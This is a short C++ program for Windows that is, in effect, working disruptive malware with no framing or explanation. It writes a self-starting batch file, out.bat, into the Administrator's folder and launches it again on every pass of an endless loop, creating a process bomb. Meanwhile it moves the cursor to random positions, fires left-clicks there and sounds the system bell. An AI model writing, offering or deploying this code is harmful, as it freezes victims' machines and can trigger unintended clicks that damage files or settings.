#include<bits/stdc++.h>
#include<windows.h>
int sj(int a,int b)
{
	return rand()%(b-a+1)+a;
}
int main()
{
	POINT p; 
	int a;
	srand((unsigned)time(NULL));
	freopen("C://Users//Administrator//out.bat","w",stdout);
	printf("start C://Users//Administrator//out.bat");
	fclose(stdout);
	while(1)
	{
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x+sj(10,2100),p.y);
			++a;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x,p.y+sj(10,2100));
			++a;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x-sj(10,2100),p.y);
			++a;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x,p.y-sj(10,2100));
			++a;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		system("C:\\Users\\Administrator\\out.bat");
	}
	return 0;
}
